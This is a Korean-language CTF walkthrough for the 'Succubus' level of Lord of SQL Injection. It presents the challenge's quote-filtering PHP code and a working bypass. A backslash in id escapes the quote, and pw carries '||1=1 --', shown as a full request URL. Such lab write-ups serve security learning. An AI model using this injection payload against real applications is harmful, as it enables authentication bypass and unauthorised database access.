# Lord of SQL Injection No.17 Succubus

Succubus 문제는 `'`를 사용하지 않고 `pw` 절을 닫은 후 원하는 값을 넣을 수 있도록 유도한 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```

```php
if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
if(preg_match('/\'/i', $_GET[pw])) exit("HeHe");
```

`$_GET` 방식으로 받는 `id`와 `pw`에서 `'`가 필터링되면 `HeHe`를 출력하고 문제 풀이에 실패하게 된다.

#### 문제 풀이 조건

```php
if($result['id']) solve("succubus"); 
```

`id`값이 존재하기만 하면 문제 풀이에 성공하게 된다.

## Solution

```sql
select id from prob_succubus where id='\' and pw=' ||1=1 -- ;'
```

`pw` 입력문은 임의로 `'`를 이용하면 `preg_match`의 필터링 때문에 정상적으로 닫아줄 수 없기 때문에 `id` 입력 부분에 `\`를 넣어주면 `\' and pw=` 부분이 문자열로 인식된다.

예를 들어, `'Hi my name is 'Jaehun'.'` 과 같은 문자열을 인식할 때, `'`는 문자로 인식을 할 수 없어 오류를 내뿜는다.

그렇게 때문에 `\'`를 사용하여 문자로 인식하여 오류를 수정할 수 있다.

```
http://los.eagle-jump.org/succubus_***.php?id=\&pw=%20||1=1%20--%20;
```
`id`에 `\`를 넣어주어 `pw` 입력 절을 없애고 `pw=%20`을 입력한 후 `1=1`로 항상 참으로 만들어 준 다음 주석 처리를 하여 `pw`절을 무력화 시키면 문제 풀이에 성공하게 된다.